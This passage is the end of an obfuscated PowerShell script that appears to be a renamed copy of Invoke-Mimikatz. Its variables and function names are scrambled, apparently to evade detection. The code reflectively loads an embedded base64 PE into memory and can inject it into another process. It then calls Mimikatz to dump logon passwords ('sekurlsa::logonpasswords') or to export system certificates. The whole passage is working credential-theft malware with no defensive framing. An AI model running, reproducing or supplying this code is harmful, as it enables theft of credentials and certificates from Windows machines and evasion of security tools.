					pigmies -HJOZAjGe99 $VVwmLWaT99 -lTqSCtGJ99 $lTqSCtGJ99 -Win32Constants $Win32Constants
					Write-Verbose "EXE thread has completed."
					break
				}
				else
				{
					Start-Sleep -Seconds 1
				}
			}
		}
		
		return @($PEInfo.PEHandle, $nvGhDxim99)
	}
	
	
	Function level
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$jdNQCSwb99
		)
		
		$Win32Constants = enslave
		$lTqSCtGJ99 = Gatorade
		$mVRcZsGx99 = jeweling
		
		$PEInfo = restorers -jdNQCSwb99 $jdNQCSwb99 -mVRcZsGx99 $mVRcZsGx99 -Win32Constants $Win32Constants
		
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]$gkCoySGI99 = Cinerama ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			
			while ($true)
			{
				$RiPPZyhU99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($gkCoySGI99, [Type]$mVRcZsGx99.IMAGE_IMPORT_DESCRIPTOR)
				
				if ($RiPPZyhU99.Characteristics -eq 0 `
						-and $RiPPZyhU99.FirstThunk -eq 0 `
						-and $RiPPZyhU99.ForwarderChain -eq 0 `
						-and $RiPPZyhU99.Name -eq 0 `
						-and $RiPPZyhU99.TimeDateStamp -eq 0)
				{
					Write-Verbose "Done unloading the libraries needed by the PE"
					break
				}
				$nEmrKiLD99 = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((Cinerama ([Int64]$PEInfo.PEHandle) ([Int64]$RiPPZyhU99.Name)))
				$VzhzRdUw99 = $lTqSCtGJ99.GetModuleHandle.Invoke($nEmrKiLD99)
				if ($VzhzRdUw99 -eq $null)
				{
					Write-Warning "Error getting DLL handle in MemoryFreeLibrary, DLLName: $nEmrKiLD99. Continuing anyways" -WarningAction Continue
				}
				
				$nYGBOReT99 = $lTqSCtGJ99.FreeLibrary.Invoke($VzhzRdUw99)
				if ($nYGBOReT99 -eq $false)
				{
					Write-Warning "Unable to free library: $nEmrKiLD99. Continuing anyways." -WarningAction Continue
				}
				
				$gkCoySGI99 = Cinerama ($gkCoySGI99) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$mVRcZsGx99.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
		
		Write-Verbose "Calling dllmain so the DLL knows it is being unloaded"
		$INHKkciz99 = Cinerama ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
		$pJgPuKbH99 = prefix @([IntPtr], [UInt32], [IntPtr]) ([Bool])
		$UKqRjkdz99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($INHKkciz99, $pJgPuKbH99)
		
		$UKqRjkdz99.Invoke($PEInfo.PEHandle, 0, [IntPtr]::Zero) | Out-Null
		
		
		$nYGBOReT99 = $lTqSCtGJ99.VirtualFree.Invoke($jdNQCSwb99, [UInt64]0, $Win32Constants.MEM_RELEASE)
		if ($nYGBOReT99 -eq $false)
		{
			Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
		}
	}
	Function Main
	{
		$lTqSCtGJ99 = Gatorade
		$mVRcZsGx99 = jeweling
		$Win32Constants =  enslave
		
		$NNjQlKkH99 = [IntPtr]::Zero
	
		if (($GOfrdYkU99 -ne $null) -and ($GOfrdYkU99 -ne 0) -and ($GNjOXyNt99 -ne $null) -and ($GNjOXyNt99 -ne ""))
		{
			Throw "Can't supply a ProcId and ProcName, choose one or the other"
		}
		elseif ($GNjOXyNt99 -ne $null -and $GNjOXyNt99 -ne "")
		{
			$xMFoZrtS99 = @(Get-Process -Name $GNjOXyNt99 -ErrorAction SilentlyContinue)
			if ($xMFoZrtS99.Count -eq 0)
			{
				Throw "Can't find process $GNjOXyNt99"
			}
			elseif ($xMFoZrtS99.Count -gt 1)
			{
				$dZVUDzNj99 = Get-Process | where { $_.Name -eq $GNjOXyNt99 } | Select-Object ProcessName, Id, SessionId
				Write-Output $dZVUDzNj99
				Throw "More than one instance of $GNjOXyNt99 found, please specify the process ID to inject in to."
			}
			else
			{
				$GOfrdYkU99 = $xMFoZrtS99[0].ID
			}
		}
		
		
		if (($GOfrdYkU99 -ne $null) -and ($GOfrdYkU99 -ne 0))
		{
			$NNjQlKkH99 = $lTqSCtGJ99.OpenProcess.Invoke(0x001F0FFF, $false, $GOfrdYkU99)
			if ($NNjQlKkH99 -eq [IntPtr]::Zero)
			{
				Throw "Couldn't obtain the handle for process ID: $GOfrdYkU99"
			}
			
			Write-Verbose "Got the handle for the remote process to inject in to"
		}
		
		Write-Verbose "Calling landlocked"
        try
        {
            $rgRulDiJ99 = Get-WmiObject -Class Win32_Processor
        }
        catch
        {
            throw ($_.Exception)
        }
        if ($rgRulDiJ99 -is [array])
        {
            $wGXAottL99 = $rgRulDiJ99[0]
        } else {
            $wGXAottL99 = $rgRulDiJ99
        }
        if ( ( $wGXAottL99.AddressWidth) -ne (([System.IntPtr]::Size)*8) )
        {
            Write-Verbose ( "Architecture: " + $wGXAottL99.AddressWidth + " Process: " + ([System.IntPtr]::Size * 8))
            Write-Error "PowerShell architecture (32bit/64bit) doesn't match OS architecture. 64bit PS must be used on a 64bit OS." -ErrorAction Stop
        }
        if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8)
        {
            [Byte[]]$sXOvCBLB99 = [Byte[]][Convert]::FromBase64String($emlwBouH99)
        }
        else
        {
            [Byte[]]$sXOvCBLB99 = [Byte[]][Convert]::FromBase64String($onuItxvK99)
        }
        $sXOvCBLB99[0] = 0
        $sXOvCBLB99[1] = 0
		$jdNQCSwb99 = [IntPtr]::Zero
		if ($NNjQlKkH99 -eq [IntPtr]::Zero)
		{
			$eBgJcjST99 = landlocked -sXOvCBLB99 $sXOvCBLB99 -OOQlQQxw99 $OOQlQQxw99
		}
		else
		{
			$eBgJcjST99 = landlocked -sXOvCBLB99 $sXOvCBLB99 -OOQlQQxw99 $OOQlQQxw99 -NNjQlKkH99 $NNjQlKkH99
		}
		if ($eBgJcjST99 -eq [IntPtr]::Zero)
		{
			Throw "Unable to load PE, handle returned is NULL"
		}
		
		$jdNQCSwb99 = $eBgJcjST99[0]
		$ZPucgfZN99 = $eBgJcjST99[1] #only matters if you loaded in to a remote process
		
		
		$PEInfo = restorers -jdNQCSwb99 $jdNQCSwb99 -mVRcZsGx99 $mVRcZsGx99 -Win32Constants $Win32Constants
		if (($PEInfo.FileType -ieq "DLL") -and ($NNjQlKkH99 -eq [IntPtr]::Zero))
		{
                    Write-Verbose "Calling function with WString return type"
				    [IntPtr]$UnGvzVhO99 = disclosing -jdNQCSwb99 $jdNQCSwb99 -FunctionName "powershell_reflective_mimikatz"
				    if ($UnGvzVhO99 -eq [IntPtr]::Zero)
				    {
					    Throw "Couldn't find function address."
				    }
				    $mBZWUuti99 = prefix @([IntPtr]) ([IntPtr])
				    $uIlqRQsW99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($UnGvzVhO99, $mBZWUuti99)
                    $wqmJsFoQ99 = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($OOQlQQxw99)
				    [IntPtr]$zaMdtshF99 = $uIlqRQsW99.Invoke($wqmJsFoQ99)
                    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($wqmJsFoQ99)
				    if ($zaMdtshF99 -eq [IntPtr]::Zero)
				    {
				    	Throw "Unable to get output, Output Ptr is NULL"
				    }
				    else
				    {
				        $xNYyywqf99 = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($zaMdtshF99)
				        Write-Output $xNYyywqf99
				        $lTqSCtGJ99.LocalFree.Invoke($zaMdtshF99);
				    }
		}
		elseif (($PEInfo.FileType -ieq "DLL") -and ($NNjQlKkH99 -ne [IntPtr]::Zero))
		{
			$cTqAecHO99 = disclosing -jdNQCSwb99 $jdNQCSwb99 -FunctionName "VoidFunc"
			if (($cTqAecHO99 -eq $null) -or ($cTqAecHO99 -eq [IntPtr]::Zero))
			{
				Throw "VoidFunc couldn't be found in the DLL"
			}
			
			$cTqAecHO99 = spate $cTqAecHO99 $jdNQCSwb99
			$cTqAecHO99 = Cinerama $cTqAecHO99 $ZPucgfZN99
			
			$MzscwpQY99 = interpretations -LSvQiNgY99 $NNjQlKkH99 -StartAddress $cTqAecHO99 -lTqSCtGJ99 $lTqSCtGJ99
		}
		
		if ($NNjQlKkH99 -eq [IntPtr]::Zero)
		{
			level -jdNQCSwb99 $jdNQCSwb99
		}
		else
		{
			$nYGBOReT99 = $lTqSCtGJ99.VirtualFree.Invoke($jdNQCSwb99, [UInt64]0, $Win32Constants.MEM_RELEASE)
			if ($nYGBOReT99 -eq $false)
			{
				Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
			}
		}
		
		Write-Verbose "Done!"
	}
	Main
}
Function Main
{
	if (($PSCmdlet.MyInvocation.BoundParameters["Debug"] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters["Debug"].IsPresent)
	{
		$vbsuoxJl99  = "Continue"
	}
	
	Write-Verbose "PowerShell ProcessID: $PID"
	
	if ($PsCmdlet.ParameterSetName -ieq "DumpCreds")
	{
		$OOQlQQxw99 = "sekurlsa::logonpasswords exit"
	}
    elseif ($PsCmdlet.ParameterSetName -ieq "DumpCerts")
    {
        $OOQlQQxw99 = "crypto::cng crypto::capi `"crypto::certificates /export`" `"crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE`" exit"
    }
    else
    {
        $OOQlQQxw99 = $Command
    }
    [System.IO.Directory]::SetCurrentDirectory($pwd)
    
	if ($mTpmjJco99 -eq $null -or $mTpmjJco99 -imatch "^\s*$")
	{
		Invoke-Command -ScriptBlock $BXLTNCnx99 -ArgumentList @($emlwBouH99, $onuItxvK99, "Void", 0, "", $OOQlQQxw99)
	}
	else
	{
		Invoke-Command -ScriptBlock $BXLTNCnx99 -ArgumentList @($emlwBouH99, $onuItxvK99, "Void", 0, "", $OOQlQQxw99) -mTpmjJco99 $mTpmjJco99
	}
}
Main
}